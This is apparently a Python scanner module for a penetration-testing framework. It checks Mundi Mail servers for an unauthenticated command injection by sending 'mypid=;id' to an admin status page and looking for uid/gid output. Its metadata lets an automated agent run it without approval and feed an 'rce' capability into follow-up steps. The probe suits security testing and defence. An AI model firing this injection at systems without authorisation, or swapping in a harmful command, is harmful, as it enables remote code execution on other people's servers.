#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Mundi Mail mypid command injection."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Mundi Mail - mypid Command Injection Detection',
        'description': (
            'Detects Mundi Mail RCE via /admin/status/index.php?action=stop&mypid=;id.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'mundimail', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.securityfocus.com/bid/41957',
        ],
    }

    def run(self):
        for base in ('', '/mundimail', '/mail'):
            path = f'{base}/admin/status/index.php?action=stop&mypid=;id'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='Mundi Mail mypid command injection',
                    path=f'{base}/admin/status/index.php',
                )
                return True
        return False
